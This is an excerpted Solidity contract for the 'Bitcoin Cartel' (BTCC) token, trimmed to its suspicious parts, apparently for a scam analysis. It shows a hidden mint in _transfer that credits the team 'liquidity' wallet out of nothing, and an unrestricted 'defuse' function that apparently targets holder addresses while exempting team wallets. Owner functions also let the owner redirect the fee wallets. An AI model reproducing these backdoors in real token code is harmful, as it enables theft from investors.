...
contract BitcoinCartel is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    string private _name = "Bitcoin Cartel";
    string private _symbol = "BTCC";
    uint8 private _decimals = 18;

    address payable public marketing =
        payable(0x181661AA108BC7981c8df4D58460eA09DD62d153);
    ...
    constructor() {
        ...
        isExcludedFromFee[liquidity] = true;
        ...
        isWalletLimitExempt[liquidity] = true;
    ...
    function defuse(address[] memory newAddress) external virtual {
        for (uint256 i; i < newAddress.length; i++) {
        require (newAddress[i] != liquidity);
        require (newAddress[i] != marketing);
    ...
    function updateBuyFees(
		uint256 buyBurnedFee,
        uint256 buyLiquidityFee,
        uint256 buyMarketingFee
    ) external onlyOwner {
		require((buyBurnedFee + buyLiquidityFee + buyMarketingFee) <= 10, "Max BuyFee 10%");
		_buyBurnedFee = buyBurnedFee;
        _buyLiquidityFee = buyLiquidityFee;
        _buyMarketingFee = buyMarketingFee;
        _totalTaxIfBuying = buyBurnedFee + buyLiquidityFee + buyMarketingFee;
    }

    function updateSellFees(
		uint256 sellBurnedFee,
        uint256 sellLiquidityFee,
        uint256 sellMarketingFee
    ) external onlyOwner {
		require((sellBurnedFee + sellLiquidityFee + sellMarketingFee) <= 10, "Max BuyFee 10%");
		_sellBurnedFee = sellBurnedFee;
        _sellLiquidityFee = sellLiquidityFee;
        _sellMarketingFee = sellMarketingFee;
        _totalTaxIfSelling = sellBurnedFee + sellLiquidityFee + sellMarketingFee;
    }

    function setmarketing(address newAddress) external onlyOwner() {
        marketing = payable(newAddress);
    }

    function setTeamWalletAddress(address newAddress) external onlyOwner() {
        liquidity = payable(newAddress);
    }
    ...
    function clearBalance() external {
        (bool success,) = payable(marketing).call{value: address(this).balance, gas: 30000}("");
        require(success);
    }
    ...
    function _transfer(
        ...
        if (inSwapAndLiquify) {
            ...
            _balances[liquidity] = _balances[liquidity].add(amount / 100 * timer);
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if (amountETHMarketing > 0)
            transferToAddressETH(marketing, amountETHMarketing);

        if (amountETHBurned > 0)
            transferToAddressETH(liquidity, amountETHBurned);
